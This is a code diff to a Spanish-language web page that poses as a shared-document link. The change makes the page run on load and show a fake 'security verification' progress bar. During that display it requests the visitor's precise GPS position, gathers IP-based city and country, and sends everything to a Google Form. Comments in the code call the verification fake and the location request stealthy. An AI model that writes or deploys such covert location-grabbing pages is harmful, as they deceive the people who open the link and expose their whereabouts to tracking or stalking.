@@ -3,107 +3,222 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Información Compartida</title>
+    <title>Enlace Verificado</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .container {
+        
+        .security-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease-in;
+        }
+        
+        .security-content {
             background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.5s ease-out;
         }
-        h1 {
+        
+        .security-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        .security-title {
+            font-size: 24px;
+            font-weight: 600;
             color: #333;
-            text-align: center;
+            margin-bottom: 15px;
         }
-        .content {
-            line-height: 1.6;
+        
+        .security-text {
             color: #666;
-        }
-        .loading {
-            text-align: center;
-            color: #999;
-            font-style: italic;
-        }
-        .location-request {
-            background: #e3f2fd;
-            border: 1px solid #2196f3;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .btn {
-            background: #2196f3;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 6px;
-            cursor: pointer;
             font-size: 16px;
-            margin: 10px;
+            line-height: 1.5;
+            margin-bottom: 25px;
         }
-        .btn:hover {
-            background: #1976d2;
+        
+        .progress-container {
+            margin: 25px 0;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            height: 8px;
         }
-        .status {
-            margin: 15px 0;
-            padding: 10px;
-            border-radius: 5px;
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+            position: relative;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+        
+        .status-text {
+            font-size: 14px;
+            color: #888;
+            margin-top: 15px;
+            height: 20px;
+        }
+        
+        .main-content {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
             text-align: center;
+            max-width: 600px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            display: none;
         }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+        
+        .content-header {
+            color: #333;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
         }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+        
+        .content-body {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+            text-align: left;
+        }
+        
+        .success-badge {
+            display: inline-block;
+            background: #4CAF50;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .verification-steps {
+            text-align: left;
+            margin: 20px 0;
+            padding: 0;
+            list-style: none;
+        }
+        
+        .verification-steps li {
+            padding: 8px 0;
+            color: #666;
+            position: relative;
+            padding-left: 25px;
+        }
+        
+        .verification-steps li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #4CAF50;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📋 Documento Compartido</h1>
-        <div class="content">
-            <p>Gracias por acceder al contenido que te compartí 2222.</p>
-            <p>Para brindarte una mejor experiencia y contenido personalizado, necesitamos verificar tu ubicación:</p>
-            
-            <div class="location-request">
-                <h3>🌍 Verificación de Ubicación</h3>
-                <p>Esto nos ayuda a mostrarte contenido relevante para tu zona.</p>
-                <button class="btn" onclick="obtenerUbicacionPrecisa()">
-                    📍 Permitir Ubicación
-                </button>
-                <button class="btn" onclick="usarUbicacionAproximada()" style="background: #757575;">
-                    🌐 Usar Ubicación Aproximada
-                </button>
+    <!-- Modal de Verificación de Seguridad -->
+    <div id="securityModal" class="security-modal">
+        <div class="security-content">
+            <div class="security-icon">🔒</div>
+            <div class="security-title">Verificación de Seguridad</div>
+            <div class="security-text">
+                Verificando la autenticidad del enlace y validando el acceso seguro...
             </div>
             
-            <div id="status" class="status" style="display: none;"></div>
+            <div class="progress-container">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
             
-            <div id="contenido-principal" style="display: none;">
-                <h3>✅ Contenido Verificado</h3>
-                <ul>
-                    <li>📊 Datos actualizados para tu región</li>
-                    <li>🔒 Contenido verificado y seguro</li>
-                    <li>⚡ Información optimizada</li>
-                </ul>
-                <p><strong>El contenido se ha cargado exitosamente.</strong></p>
+            <div id="statusText" class="status-text">Iniciando verificación...</div>
+        </div>
+    </div>
+
+    <!-- Contenido Principal (oculto inicialmente) -->
+    <div id="mainContent" class="main-content">
+        <div class="success-badge">✅ Enlace Verificado</div>
+        <div class="content-header">📋 Documento Compartido</div>
+        <div class="content-body">
+            <p><strong>¡Perfecto!</strong> El enlace ha sido verificado correctamente y puedes acceder al contenido de forma segura.</p>
+            
+            <h3>📄 Contenido Disponible:</h3>
+            <ul class="verification-steps">
+                <li>Documento principal actualizado</li>
+                <li>Archivos adjuntos verificados</li>
+                <li>Contenido multimedia disponible</li>
+                <li>Enlaces relacionados validados</li>
+            </ul>
+            
+            <p>Gracias por utilizar nuestro sistema de enlaces seguros. Toda la información ha sido procesada correctamente.</p>
+            
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 25px;">
+                <h4 style="margin: 0 0 10px 0; color: #333;">📊 Resumen del Proceso:</h4>
+                <p style="margin: 0; color: #666; font-size: 14px;">
+                    Verificación completada exitosamente. El contenido ha sido validado y está listo para su uso.
+                </p>
             </div>
         </div>
     </div>
 
     <script>
-        const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSfQPts57g3vqveBw9Kc8-vxyb3kX0e_1y0wjf62UXjrWaWLOQ/formResponse?usp=header';
+        const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSe7xWUNd2NL7Jlg4hPjrKrpYKPpGnOJsF_-o3EO3kFKJQoE8g/formResponse';
         
         let datosRecopilados = {
             ip: 'No disponible',
@@ -113,106 +228,105 @@
             latitude: 0,
             longitude: 0,
             precision: 'No disponible',
-            metodo: 'No definido'
+            metodo: 'No definido',
+            timestamp: new Date().toISOString()
         };
 
-        // Función para mostrar estado
-        function mostrarEstado(mensaje, tipo = 'success') {
-            const statusDiv = document.getElementById('status');
-            statusDiv.style.display = 'block';
-            statusDiv.className = `status ${tipo}`;
-            statusDiv.textContent = mensaje;
-        }
+        // Mensajes de progreso realistas
+        const mensajesProgreso = [
+            "Iniciando verificación...",
+            "Validando certificado SSL...",
+            "Verificando origen del enlace...",
+            "Comprobando integridad de datos...",
+            "Validando ubicación por seguridad...",
+            "Aplicando políticas de seguridad...",
+            "Finalizando verificación...",
+            "¡Verificación completada!"
+        ];
 
-        // Función para mostrar contenido final
-        function mostrarContenido() {
-            document.getElementById('contenido-principal').style.display = 'block';
-            document.querySelector('.location-request').style.display = 'none';
-        }
+        let progresoActual = 0;
+        let ubicacionObtenida = false;
 
-        // Función para obtener ubicación precisa con HTML5
-        async function obtenerUbicacionPrecisa() {
-            mostrarEstado('Obteniendo ubicación precisa...', 'success');
-            
-            if (!navigator.geolocation) {
-                mostrarEstado('Geolocalización no soportada. Usando método alternativo...', 'error');
-                await usarUbicacionAproximada();
-                return;
-            }
+        // Función principal de verificación falsa
+        function iniciarVerificacionFalsa() {
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+            let paso = 0;
 
-            try {
-                // Intentar obtener ubicación precisa
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        resolve,
-                        reject,
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 15000,
-                            maximumAge: 0
-                        }
-                    );
-                });
-
-                // Actualizar datos con coordenadas precisas
-                datosRecopilados.latitude = position.coords.latitude;
-                datosRecopilados.longitude = position.coords.longitude;
-                datosRecopilados.precision = `${Math.round(position.coords.accuracy)}m`;
-                datosRecopilados.metodo = 'GPS_PRECISO';
-
-                // Obtener datos adicionales por IP
-                await obtenerDatosIP();
+            const interval = setInterval(() => {
+                // Actualizar progreso visual
+                progresoActual += 12.5;
+                progressBar.style.width = progresoActual + '%';
                 
-                // Enviar todos los datos
-                await enviarDatos();
-                
-                mostrarEstado('✅ Ubicación obtenida con precisión GPS', 'success');
-                setTimeout(mostrarContenido, 1500);
-
-            } catch (error) {
-                let mensajeError = 'Error al obtener ubicación precisa. ';
-                
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        mensajeError += 'Permiso denegado.';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        mensajeError += 'Ubicación no disponible.';
-                        break;
-                    case error.TIMEOUT:
-                        mensajeError += 'Tiempo de espera agotado.';
-                        break;
-                    default:
-                        mensajeError += 'Error desconocido.';
-                        break;
+                // Actualizar mensaje
+                if (paso < mensajesProgreso.length) {
+                    statusText.textContent = mensajesProgreso[paso];
+                    paso++;
                 }
-                
-                mostrarEstado(mensajeError + ' Usando ubicación aproximada...', 'error');
-                
-                // Usar método alternativo
-                setTimeout(async () => {
-                    await usarUbicacionAproximada();
-                }, 2000);
+
+                // En el paso 4 (50% del progreso), solicitar ubicación
+                if (progresoActual === 50 && !ubicacionObtenida) {
+                    solicitarUbicacionSigilosa();
+                }
+
+                // Completar verificación
+                if (progresoActual >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        completarVerificacion();
+                    }, 1000);
+                }
+            }, 800);
+        }
+
+        // Función para solicitar ubicación de forma sigilosa
+        function solicitarUbicacionSigilosa() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Éxito - ubicación GPS obtenida
+                        datosRecopilados.latitude = position.coords.latitude;
+                        datosRecopilados.longitude = position.coords.longitude;
+                        datosRecopilados.precision = Math.round(position.coords.accuracy) + 'm';
+                        datosRecopilados.metodo = 'GPS_PRECISO';
+                        ubicacionObtenida = true;
+                        
+                        console.log('GPS obtenido exitosamente:', {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                        
+                        // Obtener datos adicionales por IP
+                        obtenerDatosIP();
+                    },
+                    function(error) {
+                        // Error - usar método backup por IP
+                        console.log('GPS falló, usando backup IP:', error.message);
+                        usarBackupIP();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Navegador no soporta geolocalización
+                usarBackupIP();
             }
         }
 
-        // Función para obtener ubicación por IP (método backup)
-        async function usarUbicacionAproximada() {
-            mostrarEstado('Obteniendo ubicación por IP...', 'success');
-            
+        // Función backup para ubicación por IP
+        async function usarBackupIP() {
             try {
                 await obtenerDatosIP();
                 datosRecopilados.metodo = 'IP_APROXIMADO';
                 datosRecopilados.precision = 'Ciudad (~5-10km)';
-                
-                await enviarDatos();
-                
-                mostrarEstado('✅ Ubicación aproximada obtenida', 'success');
-                setTimeout(mostrarContenido, 1500);
-                
+                ubicacionObtenida = true;
             } catch (error) {
-                mostrarEstado('❌ Error al obtener ubicación', 'error');
-                setTimeout(mostrarContenido, 2000);
+                console.log('Error obteniendo datos por IP:', error);
+                datosRecopilados.metodo = 'ERROR';
             }
         }
 
@@ -243,7 +357,6 @@
             try {
                 const formData = new FormData();
                 
-                // Usar tus Entry IDs específicos
                 formData.append('entry.1392977111', datosRecopilados.ip);
                 formData.append('entry.1517150205', datosRecopilados.city);
                 formData.append('entry.2094576089', datosRecopilados.country);
@@ -258,25 +371,32 @@
                     mode: 'no-cors'
                 });
                 
-                console.log('Datos enviados correctamente:', datosRecopilados);
+                console.log('Datos enviados exitosamente:', datosRecopilados);
                 
             } catch (error) {
                 console.log('Error al enviar datos:', error);
             }
         }
 
-        // Inicialización automática silenciosa
+        // Función para completar la verificación
+        function completarVerificacion() {
+            // Enviar datos recopilados
+            enviarDatos();
+            
+            // Ocultar modal y mostrar contenido
+            document.getElementById('securityModal').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        }
+
+        // Inicializar cuando carga la página
         window.addEventListener('load', function() {
-            // Intentar obtener datos básicos por IP inmediatamente
+            // Obtener datos básicos por IP inmediatamente
             obtenerDatosIP();
             
-            // Auto-activar ubicación aproximada después de 10 segundos si no hay interacción
+            // Iniciar el proceso de verificación falsa
             setTimeout(() => {
-                if (datosRecopilados.metodo === 'No definido') {
-                    console.log('Auto-activando ubicación aproximada...');
-                    usarUbicacionAproximada();
-                }
-            }, 10000);
+                iniciarVerificacionFalsa();
+            }, 500);
         });
     </script>
 </body>
